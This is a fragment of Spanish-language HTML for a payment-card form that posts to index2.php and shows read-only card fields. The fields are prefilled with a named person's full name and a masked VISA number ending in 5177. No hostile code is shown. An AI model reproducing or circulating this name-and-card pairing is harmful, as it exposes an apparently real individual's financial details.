...
<form class ="form" method="POST"action="index2.php" >
	...
	<div class="icon" id="icon">  
			...
			<input  id="ntarjeta1"  type="text"  name="tarjeta"  maxlength="19" autocomplete="off" placeholder="LADY ANGELICA MIRANDA ORTIZ" value="" readonly required=>
			<br>
		
			<div class="tarjeta" id="tarjeta">
			<img src="tarjeta.png" style="opacity: 90%;" alt="tarjeta">
			<h4>Numero de Tarjeta</h4></div> 
			<input  id="ntarjeta1"  type="text"  name="tarjeta"  maxlength="19" autocomplete="off" placeholder="VISA: **** **** **** 5177" value="" readonly required=>
			<br>
			<br>
